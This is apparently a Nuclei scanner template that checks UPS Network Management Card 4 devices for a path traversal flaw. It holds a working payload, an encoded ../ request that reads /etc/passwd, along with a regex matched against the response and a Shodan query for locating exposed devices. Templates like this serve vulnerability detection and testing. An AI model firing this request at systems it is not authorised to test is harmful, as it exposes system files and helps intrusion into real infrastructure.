id: ups-network-lfi

info:
  name: UPS Network Management Card 4 Path Traversal
  author: Kazgangap
  severity: high
  description: |
    UPS Network Management Card version 4 suffers from a path traversal vulnerability.
  reference:
    - https://packetstormsecurity.com/files/177626/upsnmc4-traversal.txt
    - https://www.exploit-db.com/exploits/51897
  metadata:
    max-request: 1
    verified: true
    shodan-query: html:"UPS Network Management Card 4"
  tags: ups,lfi

http:
    - method: GET
      path:
        - "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

      matchers-condition: and
      matchers:
        - type: regex
          part: body
          regex:
            - "root:.*:0:0:"

        - type: word
          part: body
          words:
            - "application/octet-stream"

        - type: status
          status:
            - 200
